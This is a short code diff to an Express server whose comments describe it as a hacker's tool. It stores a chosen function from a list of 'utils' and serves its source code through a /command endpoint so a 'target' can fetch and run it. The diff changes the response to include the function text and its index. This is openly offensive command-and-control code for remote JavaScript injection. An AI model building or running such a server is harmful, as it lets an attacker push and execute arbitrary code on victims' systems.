@@ -19,7 +19,8 @@ app.use(express.urlencoded())
 
 // By default, activate with first function
 const activeFuncs = {
-  "active": utils[0].func,
+  "index": 0,
+  "function": utils[0].func.toString(),
 }
 
 // Hacker will send the javascript content to server
@@ -39,15 +40,16 @@ app.post('/utils', (req, res) => {
     res.send("Wrong index...");
   }
   else{
-    activeFuncs.active = utils[index].func;
+    activeFuncs.function = utils[index].func.toString();
+    activeFuncs.index = index;
     res.send("Function injected");
   }
 })
 
 // Sends the code to be injected to the "target"
 app.get('/command', (req, res) => {
-  if(activeFuncs.active !== null){
-    res.send({ "function": activeFuncs.active.toString() })
+  if(activeFuncs.function !== null){
+    res.send(activeFuncs)
   }
 })
 
